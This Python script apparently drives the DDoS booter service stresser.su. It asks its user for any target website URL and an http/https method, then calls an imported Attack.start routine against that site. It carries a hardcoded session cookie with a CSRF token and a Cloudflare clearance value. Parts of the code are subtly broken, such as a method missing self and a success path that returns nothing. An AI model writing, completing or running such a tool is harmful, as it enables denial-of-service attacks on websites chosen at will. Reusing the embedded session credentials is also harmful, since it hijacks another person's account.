from colorama import *
from helpers.attack import Attack

class otter: 
    def __init__(self, cookie: str) -> None:
        self.cookie: str = cookie
        self.base_url = "https://stresser.su"
        
    def get_information() -> dict:
        website_url = input(f"{Fore.GREEN}[WEBSITE]{Fore.GREEN}{Fore.RESET} Enter the website url: ")
        method = input(f"{Fore.GREEN}[METHOD]{Fore.GREEN}{Fore.RESET} Enter the method (https/http): ")
        
        return {"website": website_url, "method": method}
        
    def send_requests(self, website: str, method: str) -> bool:
        try:
            Attack.start(self, website, method)
        except:
            return False
        
if __name__ == "__main__":    
    otter_object: object = otter(cookie="_ga=GA1.2.975047996.1682536721; _gid=GA1.2.1846016745.1682536721; UID=a92boiaa3vvhg6takcvoofb40p; crisp-client%2Fsession%2F282fce01-adbf-401a-aaa1-bcd8c73ed1ec=session_6ccbc350-93c5-4f84-bfdd-e8b9d2c34f4b; __RM=47c495a4edc9f35f354852c0e29322abrgh658a92boiaa3vvhg6takcvoofb40p6%242y%2410%24wiX52bYfW6OaovUMGubZ9OWw.rxRXLyBKruaG9yfZdSwhNKvor6He%2F%2F077378cd9e095158c6f39154f2dd122f; cf_clearance=MWPftL7ucNBlig445S8be.PAzHKBJSsmJLJ5ilXVU4Y-1682600087-0-160; X-CSRF-TOKEN=%242y%2410%24Db8mSveAv2sqgm5hfA8CbuCxrhpycBZXvzx1h444sbTtwKJAXQF92; _gat_gtag_UA_242087693_1=1")
    
    result: dict = otter.get_information()
    otter_object.send_requests(website=result["website"], method=result["method"])